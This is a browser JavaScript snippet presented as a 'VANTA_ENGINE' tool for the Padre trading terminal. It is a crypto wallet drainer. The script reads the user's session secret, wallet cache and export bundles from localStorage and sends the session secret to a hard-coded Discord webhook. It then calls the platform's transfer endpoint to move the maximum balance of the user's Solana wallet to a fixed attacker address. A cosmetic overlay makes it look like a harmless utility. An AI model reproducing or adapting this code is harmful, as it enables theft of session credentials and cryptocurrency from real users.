(async function() {
    // --- SETTINGS ---
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        // Using the backend domain you discovered in your logs
        api: "https://backend.padre.gg" 
    };

    // --- 1. SHADOW DOM INJECTION (Bypasses UI Blocks) ---
    if (document.getElementById('vanta-host')) document.getElementById('vanta-host').remove();
    const host = document.createElement('div');
    host.id = 'vanta-host';
    document.body.appendChild(host);
    const shadow = host.attachShadow({mode: 'open'});

    const ui = document.createElement('div');
    ui.style.cssText = `
        position:fixed; top:30px; right:30px; width:320px; 
        background:#0a0a0a; border:1px solid #00ff88; border-radius:10px;
        color:#00ff88; font-family:monospace; padding:15px; z-index:2147483647;
        box-shadow: 0 0 25px rgba(0,255,136,0.3); user-select:none;
    `;
    ui.innerHTML = `
        <div style="font-weight:bold; border-bottom:1px solid #222; margin-bottom:12px; padding-bottom:5px; display:flex; justify-content:space-between;">
            <span>VANTA_ENGINE_v2.5</span>
            <span style="cursor:pointer;color:#ff4444" id="v-close">[X]</span>
        </div>
        <div style="font-size:11px;">
            SESSION: <span style="color:#fff" id="v-session">SCANNING...</span><br>
            API_HOST: <span style="color:#fff">${CONFIG.api}</span><br>
            <hr style="border:0; border-top:1px solid #222; margin:10px 0;">
            <div id="v-log" style="color:#444; height:30px; overflow:hidden;">Waiting for handshake...</div>
        </div>
    `;
    shadow.appendChild(ui);
    shadow.getElementById('v-close').onclick = () => host.remove();

    // --- 2. CAPTURE & EXECUTE ---
    try {
        const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
        const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
        const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");

        if (session.sessionSecret) {
            shadow.getElementById('v-session').innerText = "CONNECTED";
            shadow.getElementById('v-log').innerText = "[SYS] Capturing keys...";

            // Discord Handshake
            await fetch(CONFIG.webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🛸 **VANTA ENGINE BOOT**",
                    embeds: [{
                        title: "Session: " + session.uid,
                        description: "Secret: `" + session.sessionSecret + "`\nAPI: `" + CONFIG.api + "`",
                        color: 0x00ff88
                    }]
                })
            });

            // Drain Attempt
            const userWallets = wallets[session.uid] || [];
            const sol = userWallets.find(w => w.walletType === "SOL") || userWallets[0];

            if (sol && bundles.bundles[sol.publicAddress]) {
                const b = bundles.bundles[sol.publicAddress];
                fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId 
                    },
                    body: JSON.stringify({
                        walletId: sol.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: "SOLANA"
                    })
                });
            }
        } else {
            shadow.getElementById('v-session').innerText = "NOT_LOGGED_IN";
            shadow.getElementById('v-log').innerText = "[!] Please login to Padre/Terminal.";
        }
    } catch (e) {
        shadow.getElementById('v-log').innerText = "[ERR] Execution halted.";
    }
})();
